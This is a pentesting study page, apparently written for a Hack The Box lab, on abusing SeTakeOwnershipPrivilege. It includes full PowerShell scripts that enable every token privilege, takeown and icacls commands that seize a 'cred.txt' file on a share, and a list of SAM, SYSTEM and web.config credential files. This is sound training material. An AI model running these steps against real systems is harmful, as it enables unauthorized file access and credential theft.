---
title: SeTakeOwnershipPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeTakeOwnershipPrivilege
---
# 🅾️ SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.

While it is rare to encounter a standard user account with this privilege, we may encounter a service account.

We may  find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

```powershell-session
whoami /priv
```

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

Output:

```powershell-session
Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```



**1.** Let's enable the permission. We will use the [EnableAllTokenPrivs.ps1 script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1):

```
## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
$definition = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;

            List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
            "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
            "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


            

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;

            foreach (var priv in privs)
            {
                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            }
        }
    }  
}
'@

$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege() 2>&1
```

**2.** We will also use the Enable-Privilege.ps1 script:

```
#Enable SeSecurityPrivilege, needed to query security information for desktop DACL
function Enable-Privilege
{
    param (
        [Parameter()]
        [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
            "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
            "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
            "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
        [String]
        $Privilege
    )

    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
    if ($ThreadHandle -eq [IntPtr]::Zero)
    {
        Throw "Unable to get the handle to the current thread"
    }

    [IntPtr]$ThreadToken = [IntPtr]::Zero
    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Result -eq $false)
    {
        if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
        {
            $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
            if ($Result -eq $false)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
            if ($Result -eq $false)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }
        }
        else
        {
            Throw ([ComponentModel.Win32Exception] $ErrorCode)
        }
    }

    $CloseHandle.Invoke($ThreadHandle) | Out-Null

    $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
    $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
    $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)

    if ($Result -eq $false)
    {
        Throw (New-Object ComponentModel.Win32Exception)
    }

    [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
    $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
    $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

    $LuidAndAttributes.Luid = $LuidObject
    $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

    [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
    $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
    $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
    $TokenPrivileges.PrivilegeCount = 1
    $TokenPrivileges.Privileges = $LuidAndAttributes

    $Global:TokenPriv = $TokenPrivileges

    Write-Verbose "Attempting to enable privilege: $Privilege"
    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Result -eq $false)
    {
        Throw (New-Object ComponentModel.Win32Exception)
    }

    $CloseHandle.Invoke($ThreadToken) | Out-Null
    Write-Verbose "Enabled privilege: $Privilege"
}                                      
```

More on the blog:  https://www.leeholmes.com/adjusting-token-privileges-in-powershell/

**3.** Run the script

```
Import-module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

And now we can use it:

```
PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

**4.** Choose with object (file, folder, shares...) you want to change owner. For instance: `C:\Department Shares\Private\IT\cred.txt`.  Check out the target file to gather a bit more information about it.

```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

**5.** Checking File Ownership:

```powershell-session
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Like this we can see who owns the share.

**6.** Taking Ownership of the File:

```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

**7.** Confirm change of ownership:

```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

**8.** However we still need to modify ACL to get to read the file.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```


#### Files of Interest

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```